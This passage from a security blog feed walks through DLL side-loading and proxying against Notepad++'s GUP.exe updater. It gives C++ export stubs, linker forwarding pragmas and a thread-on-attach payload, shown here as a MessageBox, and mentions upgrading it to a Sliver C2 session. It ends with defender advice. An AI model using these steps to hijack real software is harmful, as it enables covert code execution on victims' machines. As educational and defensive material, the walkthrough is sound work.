<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"C"</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__declspec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dllexport</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> PVOID </span><span class="token function" style="color:#d73a49">curl_easy_init</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">MessageBoxA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Group-CK13"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Simple DLL"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MB_OK </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MB_ICONEXCLAMATION</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"C"</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__declspec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dllexport</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> PVOID </span><span class="token function" style="color:#d73a49">curl_easy_setopt</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"C"</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__declspec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dllexport</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> PVOID </span><span class="token function" style="color:#d73a49">curl_easy_cleanup</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">extern</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"C"</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">__declspec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">dllexport</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> PVOID </span><span class="token function" style="color:#d73a49">curl_easy_perform</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>Now, when running <code>GUP.exe</code>, we see the MessageBox as intended.</p>
<div style="width:60%;margin:0 auto"><img src="data:image/png;base64,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" style="width:100%;height:auto"></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="combining-with-dll-proxying-for-stealth-and-functionality">Combining with DLL proxying for stealth and functionality<a href="https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp#combining-with-dll-proxying-for-stealth-and-functionality" class="hash-link" aria-label="Direct link to Combining with DLL proxying for stealth and functionality" title="Direct link to Combining with DLL proxying for stealth and functionality" translate="no">​</a></h2>
<p>However, if we proceed as described above, when the user runs GUP.exe (or updates Notepad++),
they will not see the original Message Box of the application and will not be able to perform the original functionality.</p>
<p>Therefore, we combine this with the <strong>DLL proxying</strong> technique - a method used to intercept function calls that are originally directed to a legitimate DLL file.
This is done by creating an intermediary DLL, called a Proxy DLL, which exports the same functions as the original DLL.</p>
<p>Steps:</p>
<ol>
<li class="">Rename the original DLL file to <code>gup.dll</code></li>
<li class="">Add the following <code>#pragma</code> comment directives:</li>
</ol>
<ul>
<li class="">These are linker directives used to export functions just like the original DLL, but in fact, they forward the calls to the real DLL, which is now <code>gup.dll</code></li>
<li class="">Syntax: <code>/export:function_name=originalDLL.function_name,@ordinal</code></li>
</ul>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">pragma</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">comment</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">linker</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">"/export:curl_easy_cleanup=gup.curl_easy_cleanup,@1"</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">pragma</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">comment</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">linker</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">"/export:curl_easy_init=gup.curl_easy_init,@6"</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">pragma</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">comment</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">linker</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">"/export:curl_easy_perform=gup.curl_easy_perform,@12"</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">pragma</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property expression function" style="color:#d73a49">comment</span><span class="token macro property expression punctuation" style="color:#393A34">(</span><span class="token macro property expression" style="color:#36acaa">linker</span><span class="token macro property expression punctuation" style="color:#393A34">,</span><span class="token macro property expression" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">"/export:curl_easy_setopt=gup.curl_easy_setopt,@16"</span><span class="token macro property expression punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<ul>
<li class="">Ordinal values: These are the index numbers of the exported functions, which can be viewed in tools like <code>x64dbg</code>.</li>
</ul>
<div style="width:100%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/x64-c579ea745d1dde9edb2be3a86832d338.png" style="width:100%;height:auto"></div>
<p>Write a <code>DoMagic()</code> function to display a MessageBox.
This should run in a separate thread to avoid blocking the main process:</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DWORD WINAPI </span><span class="token function" style="color:#d73a49">DoMagic</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPVOID lpParameter</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">MessageBoxA</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Group-CK13"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Simple DLL"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> MB_OK </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> MB_ICONEXCLAMATION</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">return</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>When the DLL is loaded (<code>DLL_PROCESS_ATTACH</code>), it creates a new thread to run <code>DoMagic()</code>:</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">case</span><span class="token plain"> DLL_PROCESS_ATTACH</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    threadHandle </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">CreateThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> DoMagic</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NULL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">CloseHandle</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">threadHandle</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">break</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre></div></div>
<p>At this point, when <code>GUP.exe</code> is run again, both the original Message Box from the application and the injected (malicious) Message Box will appear.</p>
<div style="width:100%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/proxy-41f564dc318311c3925a0817f77b411f.png" style="width:100%;height:auto"></div>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="establishing-remote-control-with-sliver-c2">Establishing remote control with Sliver C2<a href="https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp#establishing-remote-control-with-sliver-c2" class="hash-link" aria-label="Direct link to Establishing remote control with Sliver C2" title="Direct link to Establishing remote control with Sliver C2" translate="no">​</a></h2>
<p>To escalate the attack, we can modify the <code>DoMagic()</code> function to establish a reverse shell or C2 session.
In this case, we used Sliver C2 on a Linux machine.
Once the user launches GUP.exe (e.g., by checking for updates), a session is established on the attacker's C2 interface.</p>
<div style="width:100%;margin:0 auto"><img src="https://solivaquaant.github.io/my-small-blog/assets/images/c2-50e87282a02b29ba3c2fc013d4914c2b.png" style="width:100%;height:auto"></div>
<p>For persistence and stealth, additional techniques like process injection, registry persistence (run keys), shellcode obfuscation can be employed - though we won't detail them here due to ethical concerns.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="conclusion">Conclusion<a href="https://solivaquaant.github.io/my-small-blog/blog/dll-side-loading-notepadpp#conclusion" class="hash-link" aria-label="Direct link to Conclusion" title="Direct link to Conclusion" translate="no">​</a></h2>
<p>DLL Side Loading is a powerful and commonly abused technique in the wild. By understanding how it works, defenders can:</p>
<ul>
<li class="">Audit how applications load DLLs</li>
<li class="">Harden directory permissions</li>
<li class="">Implement application whitelisting</li>
<li class="">Monitor abnormal DLL load behavior with tools like ProcMon</li>
</ul>
<p>From a red team or educational perspective, this hands-on walkthrough using Notepad++ shows just how easy it can be to hijack execution flow when the right conditions align.</p>
<p><em>Stay safe. Stay informed.</em></p>]]></content:encoded>
            <category>Malware</category>
        </item>
        <item>
            <title><![CDATA[Stego secrets: Extracting embedded files using HxD and dd]]></title>
            <link>https://solivaquaant.github.io/my-small-blog/blog/nt334-lab2-ctf</link>
            <guid>https://solivaquaant.github.io/my-small-blog/blog/nt334-lab2-ctf</guid>
            <pubDate>Thu, 27 Mar 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Write-up of a CTF challenge from Digital Forensics course, focusing on steganography techniques to extract hidden files.]]></description>
